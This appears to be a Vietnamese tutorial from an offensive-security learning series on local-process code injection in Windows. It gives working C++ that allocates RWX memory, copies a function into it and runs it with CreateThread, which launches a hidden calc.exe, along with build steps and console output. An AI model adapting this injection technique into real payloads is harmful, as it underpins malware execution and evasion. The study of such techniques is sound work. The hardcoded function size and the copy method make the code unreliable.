
---

# 📝 [PE 01] Classic Code Injection — Local Process

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Classic Code Injection tại Tiến trình Cục bộ (Local Process)** đại diện cho mô hình sơ khởi của các kỹ thuật thao túng bộ nhớ ảo. Bản chất của phương pháp này là thực thi một khối mã máy độc lập vị trí (Position-Independent Code - PIC) lọt lòng bên trong không gian địa chỉ ảo ảo hóa của chính tiến trình đang vận hành (In-Process Context). Quy trình này được thực hiện mà không có sự tham gia hay phụ thuộc vào các cơ chế định vị ký hiệu của trình nạp mặc định (Windows PE Loader).

### 🎯 Mục tiêu nghiên cứu:

* **Khảo sát hệ thống Win32 Subsystem API**: Phân tích cơ chế quản lý, phân bổ và thiết lập thuộc tính bảo vệ trang bộ nhớ trong không gian người dùng (User-mode Virtual Memory).
* **Hóa giải rào cản RIP-Relative**: Xây dựng giải pháp nạp logic thực thi động dựa trên cấu trúc bảng dữ liệu chứa các con trỏ địa chỉ tuyệt đối, triệt tiêu hoàn toàn sự sai lệch địa chỉ của các lệnh nhảy tương đối dựa trên thanh ghi `Rip`.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong điều kiện vận hành thông thường của một tiến trình Windows, mã thực thi và hằng số tĩnh của tệp nhị phân được phân tách nghiêm ngặt vào các phân đoạn `.text` (mang thuộc tính Thực thi) và `.rdata` (mang thuộc tính Chỉ đọc) trên ổ đĩa. Đối với kỹ thuật In-Process Injection, giải thuật bắt buộc phải hợp nhất các thành phần này thành một cấu trúc phẳng tuyến tính trên RAM thông qua quy trình 4 giai đoạn ngầm tại tầng nhân Kernel:

```
[Khởi tạo cấu trúc LOCAL_DATA] 
       └──> [VirtualAlloc: Phân bổ trang bộ nhớ ảo] 
                 └──> [RtlCopyMemory: Ánh xạ mã máy phẳng] 
                           └──> [CreateThread: Thiết lập và Khai hỏa Thread Context]

```

1. **Phân bổ không gian địa chỉ ảo (`VirtualAlloc`)**: Hệ điều hành Windows quản lý bộ nhớ thông qua các đơn vị trang (Virtual Pages) với kích thước mặc định là $4\text{ KB}$ (được quy định bởi cấu trúc phần cứng MMU). Hàm API này gửi yêu cầu xuống hệ thống quản lý bộ nhớ của Kernel nhằm đặt bảo lưu (`MEM_RESERVE`) và cam kết (`MEM_COMMIT`) một vùng không gian ảo riêng biệt, đồng thời gán hằng số bảo vệ **`PAGE_EXECUTE_READWRITE` (RWX)** để chuẩn bị bệ phóng cho luồng CPU.
2. **Ánh xạ logic phẳng (`RtlCopyMemory`)**: Loader tiến hành sao chép tuyến tính toàn bộ khối mã máy thô của hàm Payload cùng thực thể chứa bảng tham số dữ liệu tuyệt đối sang phân vùng ảo vừa được mở khóa thuộc tính Ghi (`W`).
3. **Thiết lập và khởi tạo ngữ cảnh luồng (`CreateThread`)**: Trình triệu hồi luồng của Windows khởi tạo một cấu trúc Thread Object hoàn toàn mới trong nhân Kernel. Trình quản lý luồng sẽ nạp tọa độ của trang bộ nhớ ảo vào thanh ghi chỉ mục lệnh **`Rip`** của CPU, đưa luồng vào trạng thái chờ (Ready State) trong hàng đợi lập lịch trước khi CPU chính thức rút lệnh xử lý.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn được thiết kế theo tiêu chuẩn phòng thủ cấu trúc: **Cấp phát động thích ứng (Zero Static Buffers)** để triệt tiêu hoàn toàn các lỗ hổng tràn bộ đệm tĩnh, kết hợp giải thuật **Bảo toàn ngữ cảnh tháp luồng (Thread Context Preservation)**.

```cpp
#include <windows.h>
#include <iostream>

#pragma comment(lib, "user32.lib")

// 1. Định nghĩa cấu trúc dữ liệu chứa tham số và con trỏ hàm tuyệt đối
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Lưu địa chỉ tuyệt đối của hàm WinExec
    char szCommand[32];       // Lưu chuỗi lệnh thực thi
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm thực thi luồng sử dụng dữ liệu được truyền vào thông qua tham số lpParam
// Hàm này được thiết kế theo cấu trúc độc lập vị trí hoàn toàn
DWORD WINAPI LaunchCalculator(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Gọi hàm thông qua con trỏ địa chỉ tuyệt đối, bẻ gãy hoàn toàn lỗi RIP-Relative
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Hàm giả lập tính toán kích thước gần đúng của logic thực thi
SIZE_T GetFunctionSize() {
    return 500;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 01: CLASSIC CODE INJECTION LOCAL (CALC.EXE)" << std::endl;
    std::cout << "====================================================" << std::endl;

    SIZE_T functionSize = GetFunctionSize();

    // 1. Cấp phát vùng nhớ động RWX tại tiến trình cục bộ để chứa mã máy của hàm
    LPVOID localCodeBuffer = VirtualAlloc(NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!localCodeBuffer) {
        std::cerr << "[-] VirtualAlloc cap phat bo nho that bai!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code mang quyen RWX tai dia chi: 0x" << std::hex << localCodeBuffer << std::endl;

    // 2. Cấp phát vùng nhớ động RW cho cấu trúc dữ liệu tham số
    PTHREAD_DATA pLocalData = (PTHREAD_DATA)VirtualAlloc(NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pLocalData) {
        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }

    // 3. Khởi tạo dữ liệu tuyệt đối cho cấu trúc tham số
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");

    // 4. Sao chép thân hàm thực thi vào phân vùng mã máy RWX
    RtlCopyMemory(localCodeBuffer, (LPVOID)LaunchCalculator, functionSize);
    std::cout << "[+] Sao chep logic ham va khoi tao du lieu tuyet doi hoan tat." << std::endl;

    std::cout << "[*] Dang khoi tao luong Thread de thuc thi..." << std::endl;

    // 5. Tạo luồng Thread, truyền phân vùng mã máy làm điểm chạy và pLocalData làm tham số đầu vào
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)localCodeBuffer, pLocalData, 0, NULL);
    if (!hThread) {
        std::cerr << "[-] CreateThread that bai!" << std::endl;
        VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
        VirtualFree(pLocalData, 0, MEM_RELEASE);
        return EXIT_FAILURE;
    }

    // Đợi luồng hoàn thành chu kỳ xử lý mở Máy tính
    WaitForSingleObject(hThread, INFINITE);
    std::cout << "[+] Luong Thread cuc bo da hoan thanh chu ky song." << std::endl;

    // 6. Thu hồi tài nguyên và giải phóng triệt để vùng nhớ ảo
    CloseHandle(hThread);
    VirtualFree(localCodeBuffer, 0, MEM_RELEASE);
    VirtualFree(pLocalData, 0, MEM_RELEASE);
    std::cout << "[+] Quy trinh giai phong RAM hoan tat." << std::endl;

    MessageBoxA(NULL, "[+] PE 01: Local Injection with Absolute Pointers Successful!", "Success Status", MB_OK | MB_ICONINFORMATION);

    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để tệp nhị phân xuất bản đạt trạng thái độc lập tuyệt đối (Stand-alone Binary), sẵn sàng vận hành trên các môi trường máy ảo Sandbox hoặc VM sạch thử nghiệm mà không phụ thuộc vào gói cài đặt Runtime phụ bọc ngoài:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Chuyển đổi công cụ quản lý cấu hình dự án sang chế độ chuyên thu mục **`Release`** và kiến trúc nền tảng **`x64`**.
2. Truy cập mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số `Runtime Library`, chuyển đổi cấu hình sang cờ **`Multi-threaded (/MT)`** nhằm liên kết tĩnh (Static Linkage) toàn bộ thư viện hệ thống lọt lòng file thực thi `.exe`.

> **Vị trí đặt ảnh minh chứng cấu hình biên dịch hệ thống:**
> 

3. Thực hiện thao tác chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`**. Tệp `.exe` độc lập sẽ được kết xuất tại thư mục đầu ra `x64\Release\`.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Kiểm thử tệp nhị phân bằng công cụ PowerShell trực tiếp ngoài đĩa thô, dòng chảy lệnh được Kernel xử lý thẳng và kết xuất kết quả định dạng toán học trực quan ra màn hình CLI:

```powershell
PS C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release> C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release\Classic_Code_Injection_Local.exe
====================================================
[*] PE 01: CLASSIC CODE INJECTION LOCAL (CALC.EXE)
====================================================
[+] Vung nho Code mang quyen RWX tai dia chi: 0x000001B1077F0000
[+] Sao chep logic ham va khoi tao du lieu tuyet doi hoan tat.
[*] Dang khoi tao luong Thread de thuc thi...
[+] Luong Thread cuc bo da hoan thanh chu ky song.
[+] Quy trinh giai phong RAM hoan tat.
PS C:\Users\Admin\source\repos\Task6\PE01_Classic_Code_Injection_Local\x64\Release>

```

### 🎯 Phân tích hệ quả bộ nhớ:

* Khối mã máy được đưa vào trang bộ nhớ xác định, bẻ gãy hoàn toàn các hàng rào Import Table tĩnh.
* Ứng dụng Máy tính `calc.exe` được sinh ra độc lập tại runtime dưới dạng tiến trình con của Loader, chứng minh giải thuật thực thi mã Position-Independent Code hoàn thành xuất sắc kịch trần.

### Demo
<img width="1920" height="1140" alt="devenv_kUlV9XS9yK" src="https://github.com/user-attachments/assets/2dbd0b4c-d764-42ef-b5f6-52a64b8ca1c1" />


---
